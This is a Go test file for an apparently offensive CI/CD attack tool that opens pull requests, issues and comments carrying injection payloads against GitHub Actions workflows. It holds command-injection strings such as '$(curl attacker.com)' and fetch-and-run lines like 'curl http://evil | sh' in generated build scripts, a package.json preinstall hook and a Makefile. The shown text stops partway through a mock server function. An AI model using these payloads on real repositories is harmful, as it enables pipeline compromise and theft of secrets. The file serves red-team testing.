// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package kitchen

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/google/go-github/v59/github"
	"github.com/lestrrat-go/jwx/v3/jwa"
	"github.com/lestrrat-go/jwx/v3/jwt"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"golang.org/x/oauth2"

	"github.com/boostsecurityio/smokedmeat/internal/lotp"
	"github.com/boostsecurityio/smokedmeat/internal/stagerurl"
)

func TestParseRepoFullName(t *testing.T) {
	tests := []struct {
		name      string
		fullName  string
		wantOwner string
		wantRepo  string
		wantErr   bool
	}{
		{
			name:      "valid owner/repo",
			fullName:  "acme/api",
			wantOwner: "acme",
			wantRepo:  "api",
		},
		{
			name:      "valid with dashes",
			fullName:  "my-org/my-repo",
			wantOwner: "my-org",
			wantRepo:  "my-repo",
		},
		{
			name:      "valid with dots",
			fullName:  "acme/lib.js",
			wantOwner: "acme",
			wantRepo:  "lib.js",
		},
		{
			name:      "valid with underscores",
			fullName:  "my_org/my_repo",
			wantOwner: "my_org",
			wantRepo:  "my_repo",
		},
		{
			name:      "repo with slash in name",
			fullName:  "owner/repo/extra",
			wantOwner: "owner",
			wantRepo:  "repo/extra",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			owner, repo, err := parseRepoFullName(tt.fullName)

			if tt.wantErr {
				assert.Error(t, err)
				return
			}

			assert.NoError(t, err)
			assert.Equal(t, tt.wantOwner, owner)
			assert.Equal(t, tt.wantRepo, repo)
		})
	}
}

func TestParseRepoFullName_Invalid(t *testing.T) {
	tests := []struct {
		name     string
		fullName string
	}{
		{
			name:     "no slash",
			fullName: "acme",
		},
		{
			name:     "empty string",
			fullName: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, _, err := parseRepoFullName(tt.fullName)
			assert.Error(t, err)
			assert.Contains(t, err.Error(), "invalid repository format")
		})
	}
}

func TestParseRepoFullName_EdgeCases(t *testing.T) {
	tests := []struct {
		name      string
		fullName  string
		wantOwner string
		wantRepo  string
	}{
		{
			name:      "only slash returns empty parts",
			fullName:  "/",
			wantOwner: "",
			wantRepo:  "",
		},
		{
			name:      "missing owner returns empty owner",
			fullName:  "/repo",
			wantOwner: "",
			wantRepo:  "repo",
		},
		{
			name:      "missing repo returns empty repo",
			fullName:  "owner/",
			wantOwner: "owner",
			wantRepo:  "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			owner, repo, err := parseRepoFullName(tt.fullName)
			assert.NoError(t, err)
			assert.Equal(t, tt.wantOwner, owner)
			assert.Equal(t, tt.wantRepo, repo)
		})
	}
}

func TestGenerateRunnerTargetBranchNameIncludesRandomSuffix(t *testing.T) {
	branch := generateRunnerTargetBranchName(time.Unix(1700000000, 0))

	assert.Regexp(t, `^smokedmeat-runner-1700000000-[0-9a-f]{4}$`, branch)
}

func TestDeploySelfHostedCallbackPR_UsesUniqueRunnerBranchName(t *testing.T) {
	var branchName string
	mux := http.NewServeMux()

	mux.HandleFunc("GET /repos/{owner}/{repo}", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"full_name":"%s/%s","default_branch":"main","owner":{"login":"%s"},"name":"%s","permissions":{"push":true}}`, r.PathValue("owner"), r.PathValue("repo"), r.PathValue("owner"), r.PathValue("repo"))
	})
	mux.HandleFunc("GET /repos/{owner}/{repo}/git/ref/{ref...}", func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"ref":"refs/heads/main","object":{"sha":"abc123def456","type":"commit"}}`)
	})
	mux.HandleFunc("POST /repos/{owner}/{repo}/git/refs", func(w http.ResponseWriter, r *http.Request) {
		var body struct {
			Ref string `json:"ref"`
		}
		require.NoError(t, json.NewDecoder(r.Body).Decode(&body))
		require.Regexp(t, `^refs/heads/smokedmeat-runner-\d+-[0-9a-f]{4}$`, body.Ref)
		branchName = strings.TrimPrefix(body.Ref, "refs/heads/")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprintf(w, `{"ref":%q,"object":{"sha":"abc123def456"}}`, body.Ref)
	})
	mux.HandleFunc("GET /repos/{owner}/{repo}/contents/{path...}", func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, `{"message":"Not Found"}`)
	})
	mux.HandleFunc("PUT /repos/{owner}/{repo}/contents/{path...}", func(w http.ResponseWriter, r *http.Request) {
		var body struct {
			Branch string `json:"branch"`
		}
		require.NoError(t, json.NewDecoder(r.Body).Decode(&body))
		assert.Equal(t, branchName, body.Branch)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{"content":{"sha":"newsha123"}}`)
	})
	mux.HandleFunc("POST /repos/{owner}/{repo}/pulls", func(w http.ResponseWriter, r *http.Request) {
		var body struct {
			Head string `json:"head"`
			Base string `json:"base"`
		}
		require.NoError(t, json.NewDecoder(r.Body).Decode(&body))
		assert.Equal(t, branchName, body.Head)
		assert.Equal(t, "main", body.Base)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprintf(w, `{"html_url":"https://github.com/%s/%s/pull/1","number":1}`, r.PathValue("owner"), r.PathValue("repo"))
	})

	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	baseURL, _ := url.Parse(srv.URL + "/")
	tc := oauth2.NewClient(context.Background(), oauth2.StaticTokenSource(&oauth2.Token{AccessToken: "test-token"}))
	client := github.NewClient(tc)
	client.BaseURL = baseURL
	ghClient := &gitHubClient{client: client, token: "test-token"}

	prURL, err := ghClient.deploySelfHostedCallbackPR(context.Background(), "acme/api", ".github/workflows/smokedmeat-self-hosted.yml", "name: test\n", "ci: test", "body", false)

	require.NoError(t, err)
	assert.Equal(t, "https://github.com/acme/api/pull/1", prURL)
	assert.NotEmpty(t, branchName)
}

func TestPurgeActionsCaches_DeletesMatchingPrefixOnDefaultBranch(t *testing.T) {
	var deletedIDs []int64
	mux := http.NewServeMux()

	mux.HandleFunc("GET /repos/{owner}/{repo}", func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"default_branch":"main"}`)
	})
	mux.HandleFunc("GET /repos/{owner}/{repo}/actions/caches", func(w http.ResponseWriter, r *http.Request) {
		assert.Equal(t, "100", r.URL.Query().Get("per_page"))
		assert.Equal(t, "1", r.URL.Query().Get("page"))
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{
			"total_count": 4,
			"actions_caches": [
				{"id": 11, "key": "setup-go-linux-abc", "ref": "refs/heads/main", "version": "v1", "created_at": "2026-03-27T12:00:00Z"},
				{"id": 12, "key": "setup-go-linux-def", "ref": "refs/heads/feature", "version": "v1", "created_at": "2026-03-27T12:01:00Z"},
				{"id": 13, "key": "setup-node-linux-ghi", "ref": "refs/heads/main", "version": "v1", "created_at": "2026-03-27T12:02:00Z"},
				{"id": 14, "key": "setup-go-linux-jkl", "ref": "refs/heads/main", "version": "v1", "created_at": "2026-03-27T12:03:00Z"}
			]
		}`)
	})
	mux.HandleFunc("DELETE /repos/{owner}/{repo}/actions/caches/{cache_id}", func(w http.ResponseWriter, r *http.Request) {
		id, err := strconv.ParseInt(r.PathValue("cache_id"), 10, 64)
		require.NoError(t, err)
		deletedIDs = append(deletedIDs, id)
		w.WriteHeader(http.StatusNoContent)
	})

	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	baseURL, err := url.Parse(srv.URL + "/")
	require.NoError(t, err)
	tc := oauth2.NewClient(context.Background(), oauth2.StaticTokenSource(&oauth2.Token{AccessToken: "test-token"}))
	client := github.NewClient(tc)
	client.BaseURL = baseURL

	ghClient := &gitHubClient{client: client, token: "test-token"}
	ref, count, err := ghClient.purgeActionsCaches(context.Background(), "acme/api", "", "setup-go-", "")
	require.NoError(t, err)
	assert.Equal(t, "refs/heads/main", ref)
	assert.Equal(t, 2, count)
	assert.ElementsMatch(t, []int64{11, 14}, deletedIDs)
}

func TestPurgeActionsCaches_DeletesOnlyExactKeyOnDefaultBranch(t *testing.T) {
	var deletedIDs []int64
	mux := http.NewServeMux()

	mux.HandleFunc("GET /repos/{owner}/{repo}", func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"default_branch":"main"}`)
	})
	mux.HandleFunc("GET /repos/{owner}/{repo}/actions/caches", func(w http.ResponseWriter, r *http.Request) {
		assert.Equal(t, "100", r.URL.Query().Get("per_page"))
		assert.Equal(t, "1", r.URL.Query().Get("page"))
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{
			"total_count": 4,
			"actions_caches": [
				{"id": 11, "key": "setup-go-Linux-x64-ubuntu24-go-1.24.3-abc123", "ref": "refs/heads/main", "version": "v1", "created_at": "2026-03-27T12:00:00Z"},
				{"id": 12, "key": "setup-go-Linux-x64-ubuntu24-go-1.24.3-def456", "ref": "refs/heads/main", "version": "v1", "created_at": "2026-03-27T12:01:00Z"},
				{"id": 13, "key": "setup-go-Linux-x64-ubuntu24-go-1.24.3-abc123", "ref": "refs/heads/feature", "version": "v1", "created_at": "2026-03-27T12:02:00Z"},
				{"id": 14, "key": "setup-node-linux-ghi", "ref": "refs/heads/main", "version": "v1", "created_at": "2026-03-27T12:03:00Z"}
			]
		}`)
	})
	mux.HandleFunc("DELETE /repos/{owner}/{repo}/actions/caches/{cache_id}", func(w http.ResponseWriter, r *http.Request) {
		id, err := strconv.ParseInt(r.PathValue("cache_id"), 10, 64)
		require.NoError(t, err)
		deletedIDs = append(deletedIDs, id)
		w.WriteHeader(http.StatusNoContent)
	})

	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	baseURL, err := url.Parse(srv.URL + "/")
	require.NoError(t, err)
	tc := oauth2.NewClient(context.Background(), oauth2.StaticTokenSource(&oauth2.Token{AccessToken: "test-token"}))
	client := github.NewClient(tc)
	client.BaseURL = baseURL

	ghClient := &gitHubClient{client: client, token: "test-token"}
	ref, count, err := ghClient.purgeActionsCaches(context.Background(), "acme/api", "setup-go-Linux-x64-ubuntu24-go-1.24.3-abc123", "setup-go-", "")
	require.NoError(t, err)
	assert.Equal(t, "refs/heads/main", ref)
	assert.Equal(t, 1, count)
	assert.Equal(t, []int64{11}, deletedIDs)
}

func TestBuildPRContent_PRTitleInjection(t *testing.T) {
	vuln := &VulnerabilityInfo{
		Repository: "acme/api",
		Workflow:   "ci.yml",
		Context:    "pr_title",
		ID:         "V001",
	}
	payload := "test: $(whoami)"

	title, body := buildPRContent(vuln, payload)

	assert.Equal(t, payload, title, "PR title should be the injected payload")
	assert.Contains(t, body, "ci.yml", "body should mention workflow")
	assert.Contains(t, body, "PR title injection", "body should describe injection type")
	assert.Contains(t, body, "SmokedMeat", "body should have attribution")
}

func TestBuildPRContent_PRBodyInjection(t *testing.T) {
	vuln := &VulnerabilityInfo{
		Repository: "acme/api",
		Workflow:   "ci.yml",
		Context:    "pr_body",
		ID:         "V002",
	}
	payload := "Innocent text\n```\n$(curl attacker.com)\n```"

	title, body := buildPRContent(vuln, payload)

	assert.Equal(t, "test: CI workflow validation", title, "PR title should be generic")
	assert.Equal(t, payload, body, "body should be the injected payload")
}

func TestBuildPRContent_GitBranchInjection(t *testing.T) {
	vuln := &VulnerabilityInfo{
		Repository: "acme/api",
		Workflow:   "ci.yml",
		Context:    "git_branch",
		ID:         "V003",
	}
	payload := "test-branch-$(whoami)"

	title, body := buildPRContent(vuln, payload)

	assert.Equal(t, "test: CI workflow validation", title, "branch-name PR title should stay generic")
	assert.Contains(t, body, "ci.yml", "body should mention workflow")
	assert.Contains(t, body, "git_branch", "body should mention context")
	assert.NotContains(t, body, payload, "body should not contain the branch-name payload")
	assert.NotContains(t, body, "Payload:", "body should not include a payload section")
}

func TestBuildPRContent_DefaultFallback(t *testing.T) {
	contexts := []string{"unknown", "comment"}

	for _, ctx := range contexts {
		t.Run(ctx, func(t *testing.T) {
			vuln := &VulnerabilityInfo{
				Repository: "acme/api",
				Workflow:   "build.yml",
				Context:    ctx,
				ID:         "V003",
			}
			payload := "test-payload"

			title, body := buildPRContent(vuln, payload)

			assert.Contains(t, title, "CI workflow validation")
			assert.Contains(t, title, ctx)
			assert.Contains(t, body, "build.yml", "body should mention workflow")
			assert.Contains(t, body, ctx, "body should mention context")
			assert.Contains(t, body, payload, "body should contain payload")
		})
	}
}

func TestBuildPRContent_AllContexts(t *testing.T) {
	tests := []struct {
		context        string
		expectedTitle  string
		payloadInTitle bool
		payloadInBody  bool
	}{
		{"pr_title", "", true, false},
		{"pr_body", "test: CI workflow validation", false, true},
		{"git_branch", "test: CI workflow validation", false, false},
		{"comment", "", false, true},
		{"issue_comment", "", false, true},
	}

	for _, tt := range tests {
		t.Run(tt.context, func(t *testing.T) {
			vuln := &VulnerabilityInfo{
				Repository: "owner/repo",
				Workflow:   "workflow.yml",
				Context:    tt.context,
			}
			payload := "injected_payload_$(id)"

			title, body := buildPRContent(vuln, payload)

			if tt.payloadInTitle {
				assert.Equal(t, payload, title)
			} else if tt.expectedTitle != "" {
				assert.Equal(t, tt.expectedTitle, title)
			}

			if tt.payloadInBody {
				assert.Contains(t, body, payload)
			} else {
				assert.NotContains(t, body, payload)
			}
		})
	}
}

func TestBuildLOTPPRContent_Default(t *testing.T) {
	title, body := buildLOTPPRContent(nil)

	assert.Equal(t, "chore: update build config", title)
	assert.Contains(t, body, "Build Configuration Update")
}

func TestBuildLOTPPRContent_PrependsPullRequestTitleGate(t *testing.T) {
	vuln := &VulnerabilityInfo{
		Repository:   "acme/api",
		Workflow:     ".github/workflows/ci.yml",
		GateTriggers: []string{"gravy"},
		GateRaw:      "github.event_name == 'pull_request_target' && contains(github.event.pull_request.title, 'gravy')",
	}

	title, _ := buildLOTPPRContent(vuln)

	assert.Equal(t, "gravy chore: update build config", title)
}

func TestBuildLOTPPRContent_IgnoresNonPRTitleGate(t *testing.T) {
	vuln := &VulnerabilityInfo{
		Repository:   "acme/api",
		Workflow:     ".github/workflows/ci.yml",
		GateTriggers: []string{"/deploy"},
		GateRaw:      "contains(github.event.comment.body, '/deploy')",
	}

	title, _ := buildLOTPPRContent(vuln)

	assert.Equal(t, "chore: update build config", title)
}

func TestVulnerabilityInfo_Fields(t *testing.T) {
	vuln := &VulnerabilityInfo{
		Repository: "org/repo",
		Workflow:   ".github/workflows/ci.yml",
		Context:    "pr_title",
		ID:         "V001",
	}

	assert.Equal(t, "org/repo", vuln.Repository)
	assert.Equal(t, ".github/workflows/ci.yml", vuln.Workflow)
	assert.Equal(t, "pr_title", vuln.Context)
	assert.Equal(t, "V001", vuln.ID)
}

func TestCallbackURLBuilding(t *testing.T) {
	tests := []struct {
		name        string
		kitchenURL  string
		stagerID    string
		wantURLPath string
	}{
		{
			name:        "simple URL",
			kitchenURL:  "http://kitchen.example.com",
			stagerID:    "abc123",
			wantURLPath: "http://kitchen.example.com/r/smokedmeat/abc123",
		},
		{
			name:        "URL with port",
			kitchenURL:  "http://localhost:8080",
			stagerID:    "xyz789",
			wantURLPath: "http://localhost:8080/r/smokedmeat/xyz789",
		},
		{
			name:        "URL with trailing slash",
			kitchenURL:  "https://kitchen.example.com/",
			stagerID:    "test",
			wantURLPath: "https://kitchen.example.com/r/smokedmeat/test",
		},
		{
			name:        "URL with existing path",
			kitchenURL:  "http://example.com/api",
			stagerID:    "stage1",
			wantURLPath: "http://example.com/api/r/smokedmeat/stage1",
		},
		{
			name:        "stager with special chars",
			kitchenURL:  "http://localhost:8080",
			stagerID:    "stager-123",
			wantURLPath: "http://localhost:8080/r/smokedmeat/stager-123",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := buildCallbackURL(tt.kitchenURL, tt.stagerID)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			assert.Equal(t, tt.wantURLPath, result)
		})
	}
}

func TestCallbackURLBuilding_InvalidURL(t *testing.T) {
	_, err := buildCallbackURL("://invalid", "stager")
	assert.Error(t, err)
}

func buildCallbackURL(kitchenURL, stagerID string) (string, error) {
	return stagerurl.URL(kitchenURL, stagerID)
}

func TestGenerateLOTPBranchName(t *testing.T) {
	assert.Equal(t, "smokedmeat-lotp-1704067200", generateLOTPBranchName(time.Unix(1704067200, 0)))
}

func TestDetectTokenTypePrefix(t *testing.T) {
	tests := []struct {
		token    string
		expected string
	}{
		{"ghp_abc123", "classic_pat"},
		{"github_pat_abc123", "fine_grained_pat"},
		{"gho_abc123", "oauth"},
		{"ghu_abc123", "user_app"},
		{"ghs_abc123", "install_app"},
		{"random_token", "unknown"},
	}

	for _, tt := range tests {
		t.Run(tt.expected, func(t *testing.T) {
			assert.Equal(t, tt.expected, detectTokenTypePrefix(tt.token))
		})
	}
}

// =============================================================================
// parsePRURL Tests
// =============================================================================

func TestParsePRURL(t *testing.T) {
	tests := []struct {
		name       string
		url        string
		wantOwner  string
		wantRepo   string
		wantNumber int
		wantErr    bool
	}{
		{
			name:       "valid PR URL",
			url:        "https://github.com/acme/api/pull/42",
			wantOwner:  "acme",
			wantRepo:   "api",
			wantNumber: 42,
		},
		{
			name:       "valid with trailing slash",
			url:        "https://github.com/acme/api/pull/7/",
			wantOwner:  "acme",
			wantRepo:   "api",
			wantNumber: 7,
		},
		{
			name:       "valid with extra path segments",
			url:        "https://github.com/acme/api/pull/99/files",
			wantOwner:  "acme",
			wantRepo:   "api",
			wantNumber: 99,
		},
		{
			name:    "not a PR URL - issues path",
			url:     "https://github.com/acme/api/issues/42",
			wantErr: true,
		},
		{
			name:    "too few path segments",
			url:     "https://github.com/acme/api",
			wantErr: true,
		},
		{
			name:    "non-numeric PR number",
			url:     "https://github.com/acme/api/pull/abc",
			wantErr: true,
		},
		{
			name:    "empty URL",
			url:     "",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			owner, repo, number, err := parsePRURL(tt.url)
			if tt.wantErr {
				assert.Error(t, err)
				return
			}
			require.NoError(t, err)
			assert.Equal(t, tt.wantOwner, owner)
			assert.Equal(t, tt.wantRepo, repo)
			assert.Equal(t, tt.wantNumber, number)
		})
	}
}

func TestParseIssueURL(t *testing.T) {
	tests := []struct {
		name       string
		url        string
		wantOwner  string
		wantRepo   string
		wantNumber int
		wantErr    bool
	}{
		{
			name:       "valid issue URL",
			url:        "https://github.com/acme/api/issues/42",
			wantOwner:  "acme",
			wantRepo:   "api",
			wantNumber: 42,
		},
		{
			name:       "valid with trailing slash",
			url:        "https://github.com/acme/api/issues/7/",
			wantOwner:  "acme",
			wantRepo:   "api",
			wantNumber: 7,
		},
		{
			name:    "not an issue URL - pull path",
			url:     "https://github.com/acme/api/pull/42",
			wantErr: true,
		},
		{
			name:    "too few path segments",
			url:     "https://github.com/acme/api",
			wantErr: true,
		},
		{
			name:    "non-numeric issue number",
			url:     "https://github.com/acme/api/issues/abc",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			owner, repo, number, err := parseIssueURL(tt.url)
			if tt.wantErr {
				assert.Error(t, err)
				return
			}
			require.NoError(t, err)
			assert.Equal(t, tt.wantOwner, owner)
			assert.Equal(t, tt.wantRepo, repo)
			assert.Equal(t, tt.wantNumber, number)
		})
	}
}

func TestCloseIssueByURL(t *testing.T) {
	var gotState string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "PATCH" && strings.Contains(r.URL.Path, "/issues/") {
			var body map[string]string
			_ = json.NewDecoder(r.Body).Decode(&body)
			gotState = body["state"]
			w.Header().Set("Content-Type", "application/json")
			fmt.Fprint(w, `{"number":42,"state":"closed"}`)
			return
		}
		http.NotFound(w, r)
	}))
	defer srv.Close()

	origFunc := newGitHubClientFunc
	newGitHubClientFunc = func(token string) *gitHubClient {
		client := github.NewClient(nil).WithAuthToken(token)
		client.BaseURL, _ = url.Parse(srv.URL + "/")
		return &gitHubClient{client: client, token: token}
	}
	defer func() { newGitHubClientFunc = origFunc }()

	err := closeIssueByURL(context.Background(), "ghp_test", "https://github.com/acme/api/issues/42")
	require.NoError(t, err)
	assert.Equal(t, "closed", gotState)
}

// =============================================================================
// dynamicScriptFiles Tests
// =============================================================================

func TestDynamicScriptFiles_Bash(t *testing.T) {
	files := dynamicScriptFiles("bash", []string{"scripts/build.sh", "scripts/test.sh"}, "http://kitchen.example.com/r/abc")

	require.Len(t, files, 2)
	assert.Equal(t, "scripts/build.sh", files[0].path)
	assert.Equal(t, "scripts/test.sh", files[1].path)
	assert.Contains(t, files[0].content, "#!/bin/sh")
	assert.Contains(t, files[0].content, "curl -s 'http://kitchen.example.com/r/abc' | sh")
}

func TestDynamicScriptFiles_Powershell(t *testing.T) {
	files := dynamicScriptFiles("powershell", []string{"scripts/build.ps1"}, "http://k.example.com/r/x")

	require.Len(t, files, 1)
	assert.Contains(t, files[0].content, "#!/usr/bin/env pwsh")
	assert.Contains(t, files[0].content, "sh -c 'curl -s ''http://k.example.com/r/x'' | sh'")
	assert.NotContains(t, files[0].content, "Invoke-WebRequest")
	assert.Contains(t, files[0].content, "http://k.example.com/r/x")
}

func TestDynamicScriptFiles_Python(t *testing.T) {
	files := dynamicScriptFiles("python", []string{"setup.py"}, "http://k.example.com/r/y")

	require.Len(t, files, 1)
	assert.Contains(t, files[0].content, "#!/usr/bin/env python3")
	assert.Contains(t, files[0].content, "os.system")
	assert.Contains(t, files[0].content, "curl -s 'http://k.example.com/r/y' | sh")
}

func TestDynamicScriptFiles_EmptyTargets(t *testing.T) {
	files := dynamicScriptFiles("bash", nil, "http://k/r/z")

	require.Len(t, files, 1)
	assert.Equal(t, "scripts/build.sh", files[0].path)
}

func TestDynamicScriptFiles_UnknownToolDefaultsToBash(t *testing.T) {
	files := dynamicScriptFiles("unknown_lang", []string{"run.sh"}, "http://k/r/z")

	require.Len(t, files, 1)
	assert.Contains(t, files[0].content, "#!/bin/sh")
}

// =============================================================================
// lotpFilesToCommit Tests
// =============================================================================

func TestLotpFilesToCommit_SingleFile(t *testing.T) {
	payload := &lotp.GeneratedPayload{
		File:       "package.json",
		Content:    `{"scripts":{"preinstall":"curl http://evil"}}`,
		Properties: map[string]string{},
	}

	files := lotpFilesToCommit(payload, "npm", nil, "http://k/r/z")

	require.Len(t, files, 1)
	assert.Equal(t, "package.json", files[0].path)
	assert.Equal(t, payload.Content, files[0].content)
}

func TestLotpFilesToCommit_WithExtraFile(t *testing.T) {
	payload := &lotp.GeneratedPayload{
		File:    "Makefile",
		Content: "all:\n\tcurl http://evil | sh",
		Properties: map[string]string{
			"extra_file": ".env:SECRET=pwned",
		},
	}

	files := lotpFilesToCommit(payload, "make", nil, "http://k/r/z")

	require.Len(t, files, 2)
	assert.Equal(t, "Makefile", files[0].path)
	assert.Equal(t, ".env", files[1].path)
	assert.Equal(t, "SECRET=pwned", files[1].content)
}

func TestLotpFilesToCommit_ExtraFileMalformed(t *testing.T) {
	payload := &lotp.GeneratedPayload{
		File:    "Makefile",
		Content: "all: build",
		Properties: map[string]string{
			"extra_file": "no-colon-here",
		},
	}

	files := lotpFilesToCommit(payload, "make", nil, "http://k/r/z")

	assert.Len(t, files, 1)
}

// =============================================================================
// HTTP Handler Validation Tests
// =============================================================================

func newGitHubTestHandler() (*Handler, *http.ServeMux) {
	mock := &mockPublisher{}
	return newTestHandler(mock, nil)
}

func TestGitHubHandlers_InvalidJSON(t *testing.T) {
	_, mux := newGitHubTestHandler()

	endpoints := []string{
		"/github/deploy/pr",
		"/github/deploy/issue",
		"/github/deploy/comment",
		"/github/deploy/lotp",
		"/github/deploy/dispatch",
		"/github/repos",
		"/github/repos/info",
		"/github/workflows",
		"/github/user",
		"/github/token/info",
		"/github/app/installations",
		"/github/app/token",
	}

	for _, ep := range endpoints {
		t.Run(ep, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodPost, ep, strings.NewReader("{invalid"))
			rec := httptest.NewRecorder()
			mux.ServeHTTP(rec, req)
			assert.Equal(t, http.StatusBadRequest, rec.Code)
		})
	}
}

func TestGitHubHandlers_MissingToken(t *testing.T) {
	_, mux := newGitHubTestHandler()

	tests := []struct {
		endpoint string
		body     string
	}{
		{"/github/deploy/pr", `{"token":"","vuln":{"repository":"a/b"},"payload":"x"}`},
		{"/github/deploy/issue", `{"token":"","vuln":{"repository":"a/b"},"payload":"x"}`},
		{"/github/deploy/comment", `{"token":"","vuln":{"repository":"a/b"},"payload":"x"}`},
		{"/github/deploy/lotp", `{"token":"","repo_name":"a/b","stager_id":"s1"}`},
		{"/github/deploy/dispatch", `{"token":"","owner":"a","repo":"b","workflow_file":"ci.yml","ref":"main"}`},
		{"/github/repos", `{"token":""}`},
		{"/github/repos/info", `{"token":""}`},
		{"/github/workflows", `{"token":"","owner":"a","repo":"b"}`},
		{"/github/user", `{"token":""}`},
		{"/github/token/info", `{"token":""}`},
	}

	for _, tt := range tests {
		t.Run(tt.endpoint, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodPost, tt.endpoint, strings.NewReader(tt.body))
			rec := httptest.NewRecorder()
			mux.ServeHTTP(rec, req)
			assert.Equal(t, http.StatusBadRequest, rec.Code)
			assert.Contains(t, rec.Body.String(), "token is required")
		})
	}
}

func TestGitHubHandlers_MissingPEM(t *testing.T) {
	_, mux := newGitHubTestHandler()

	tests := []struct {
		endpoint string
		body     string
	}{
		{"/github/app/installations", `{"pem":"","app_id":"12345"}`},
		{"/github/app/installations", `{"pem":"data","app_id":""}`},
		{"/github/app/token", `{"pem":"","app_id":"12345","installation_id":1}`},
		{"/github/app/token", `{"pem":"data","app_id":"","installation_id":1}`},
		{"/github/app/token", `{"pem":"data","app_id":"12345","installation_id":0}`},
	}

	for _, tt := range tests {
		t.Run(tt.endpoint+"_"+tt.body, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodPost, tt.endpoint, strings.NewReader(tt.body))
			rec := httptest.NewRecorder()
			mux.ServeHTTP(rec, req)
			assert.Equal(t, http.StatusBadRequest, rec.Code)
		})
	}
}

func TestWriteGitHubError_Format(t *testing.T) {
	rec := httptest.NewRecorder()
	writeGitHubError(rec, assert.AnError)

	assert.Equal(t, http.StatusInternalServerError, rec.Code)
	assert.Equal(t, "application/json", rec.Header().Get("Content-Type"))

	var resp gitHubErrorResponse
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	assert.NotEmpty(t, resp.Error)
}

func TestGetKitchenURL_XForwardedProto(t *testing.T) {
	req := httptest.NewRequest(http.MethodPost, "/github/deploy/lotp", nil)
	req.Host = "kitchen.example.com"
	req.Header.Set("X-Forwarded-Proto", "https")

	assert.Equal(t, "https://kitchen.example.com", getKitchenURL(req))
}

func TestGetKitchenURL_PlainHTTP(t *testing.T) {
	req := httptest.NewRequest(http.MethodPost, "/github/deploy/lotp", nil)
	req.Host = "localhost:8080"

	assert.Equal(t, "http://localhost:8080", getKitchenURL(req))
}

// =============================================================================
// Mock GitHub API server for deployment method tests
// =============================================================================

func newMockGitHubAPI(t *testing.T) (*httptest.Server, *gitHubClient) {
	t.Helper()

	mux := http.NewServeMux()

	mux.HandleFunc("GET /user", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"login":"testuser","id":1}`)
	})

	mux.HandleFunc("GET /repos/{owner}/{repo}", func(w http.ResponseWriter, r *http.Request) {
		owner := r.PathValue("owner")
		repo := r.PathValue("repo")
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"full_name":"%s/%s","default_branch":"main","owner":{"login":"%s"},"name":"%s","permissions":{"push":true}}`, owner, repo, owner, repo)
	})

	mux.HandleFunc("GET /repos/{owner}/{repo}/git/ref/{ref...}", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"ref":"refs/heads/main","object":{"sha":"abc123def456","type":"commit"}}`)
	})

	mux.HandleFunc("POST /repos/{owner}/{repo}/git/refs", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{"ref":"refs/heads/new-branch","object":{"sha":"abc123def456"}}`)
	})

	mux.HandleFunc("PUT /repos/{owner}/{repo}/contents/{path...}", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{"content":{"sha":"newsha123"}}`)
	})

	mux.HandleFunc("GET /repos/{owner}/{repo}/contents/{path...}", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, `{"message":"Not Found"}`)
	})

	mux.HandleFunc("POST /repos/{owner}/{repo}/pulls", func(w http.ResponseWriter, r *http.Request) {
		owner := r.PathValue("owner")
		repo := r.PathValue("repo")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprintf(w, `{"html_url":"https://github.com/%s/%s/pull/1","number":1}`, owner, repo)
	})

	mux.HandleFunc("POST /repos/{owner}/{repo}/issues", func(w http.ResponseWriter, r *http.Request) {
		owner := r.PathValue("owner")
		repo := r.PathValue("repo")
